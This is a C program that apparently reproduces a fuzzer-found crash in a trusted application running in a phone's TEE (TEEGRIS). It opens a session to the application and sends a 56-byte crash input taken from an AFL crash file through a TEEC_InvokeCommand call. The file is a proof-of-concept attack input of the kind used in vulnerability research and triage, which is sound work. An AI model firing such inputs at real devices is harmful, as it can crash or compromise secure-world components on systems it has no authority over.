#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT,TEEC_VALUE_INOUT,
                                     TEEC_MEMREF_TEMP_INPUT, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
   

	unsigned char ___mitee_harness_a374_fuzz_out_default_crashes_id_000022_sig_06_src_000087_000038_time_1075866_execs_77937_op_splice_rep_2[] = {
  0x30, 0x30, 0x04, 0x00, 0xeb, 0x03, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x30, 0x04, 0x00,
  0xe8, 0x03, 0x00, 0x00, 0x30, 0x30, 0x04, 0x00, 0xea, 0x03, 0x00, 0x00,
  0x20, 0x20, 0x30, 0x1d, 0x30, 0x27, 0x27, 0x27, 0xff, 0x28, 0xe8, 0x03,
  0x64, 0x27, 0x27, 0x27, 0x27, 0x45, 0x27, 0x40
};
unsigned int ___mitee_harness_a374_fuzz_out_default_crashes_id_000022_sig_06_src_000087_000038_time_1075866_execs_77937_op_splice_rep_2_len = 56;

	memcpy(mem_area1, ___mitee_harness_a374_fuzz_out_default_crashes_id_000022_sig_06_src_000087_000038_time_1075866_execs_77937_op_splice_rep_2, ___mitee_harness_a374_fuzz_out_default_crashes_id_000022_sig_06_src_000087_000038_time_1075866_execs_77937_op_splice_rep_2_len);

    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  ___mitee_harness_a374_fuzz_out_default_crashes_id_000022_sig_06_src_000087_000038_time_1075866_execs_77937_op_splice_rep_2_len; 
    op.params[1].value.a = 0x1234; 
    op.params[1].value.b =  0x1234; 
    op.params[2].tmpref.buffer = mem_area2;  
    op.params[2].tmpref.size =  0x1000; 


    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "a734eed9-d6a1-4244-aa507c99719e7b7f";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
